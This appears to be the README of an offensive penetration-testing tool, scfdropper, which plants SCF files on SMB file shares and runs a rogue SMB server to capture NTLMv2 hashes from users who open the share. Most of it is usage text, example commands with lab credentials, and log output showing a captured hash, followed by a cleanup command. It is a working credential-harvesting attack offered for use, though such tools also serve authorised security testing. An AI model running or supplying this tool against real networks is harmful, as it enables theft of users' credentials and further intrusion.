# scfdropper
Drops SCFs onto file shares so you can grab NTLMv2 hashes in return.

# Help Menu:
```
./scfdropper.py --help
usage: scfdropper.py [-h] -ip IPADDRESS -u USER -p PWD -d DOMAIN -s SHARE
                     [-f SUBFOLDER] [-o OUTFILE] [--cleanup]

SMB Spider for PS1 Scripts

optional arguments:
  -h, --help            show this help message and exit
  -ip IPADDRESS, --ipaddress IPADDRESS
                        Target IP
  -u USER, --user USER  user
  -p PWD, --pwd PWD     password
  -d DOMAIN, --domain DOMAIN
                        domain
  -s SHARE, --share SHARE
                        SMB Share
  -f SUBFOLDER, --subfolder SUBFOLDER
                        SMB Subfolder to drop SCF file onto.
  -o OUTFILE, --outfile OUTFILE
                        Outfile to log hashes
  --cleanup             Remove SCF file from Share, MUST be ran with switches
                        used previously
```

# Example Usage:
```
./scfdropper.py -ip 192.168.204.132 -u testuser3 -p Summer2019 -d tgore.com -s SharedFolder
[+] Connection to 192.168.204.132 Successful! Dropping SCF's Now!
[*] Uploading file to: \\192.168.204.132\SharedFolder\swag.scf
[+] Done Dropping SCF's...  Launching SMBServer To Catch Creds...

10/30/2019 03:13:13 PM: INFO: Config file parsed
10/30/2019 03:13:30 PM: INFO: Incoming connection (192.168.204.135,6072)
10/30/2019 03:13:30 PM: INFO: AUTHENTICATE_MESSAGE (TGORE\testuser2,EXCHANGE)
10/30/2019 03:13:30 PM: INFO: User EXCHANGE\testuser2 authenticated successfully
10/30/2019 03:13:30 PM: INFO: testuser2::TGORE:4141414141414141:52083e7c61d560d63fe5b39b970e26d9:01010000000000000011237f5e8fd5013e7dd7bfe6ff5cc4000000000100100047006a00430070005200430059004e000200100056006c0050004a0052004900520047000300100047006a00430070005200430059004e000400100056006c0050004a005200490052004700070008000011237f5e8fd50106000400020000000800300030000000000000000000000000200000e6063cf85f7bde7f8d331a20344807a5ca3bf084434cf308beeb59a740afbd480a001000000000000000000000000000000000000900280063006900660073002f003100390032002e003100360038002e003200300034002e00310033003600000000000000000000000000
10/30/2019 03:13:30 PM: INFO: Connecting Share(1:IPC$)
10/30/2019 03:13:30 PM: INFO: Connecting Share(2:share)
KeyboardInterrupt
10/30/2019 03:13:44 PM: INFO: Disconnecting Share(1:IPC$)
10/30/2019 03:13:44 PM: INFO: Disconnecting Share(2:share)
10/30/2019 03:13:44 PM: INFO: Handle: [Errno 104] Connection reset by peer
10/30/2019 03:13:44 PM: INFO: Closing down connection (192.168.204.135,6072)
10/30/2019 03:13:44 PM: INFO: Remaining connections []


```
# Clean up your dropped SCF files
```
./scfdropper.py -ip 192.168.204.132 -u testuser3 -p Summer2019 -d TGORE -s SharedFolder -f things --cleanup
[+] Connection to 192.168.204.132 Successful! Cleaning up SCF's Now!
[*] Attempting to delete the following file: \\192.168.204.132\SharedFolder\swag.scf
[+] File has been deleted.

```
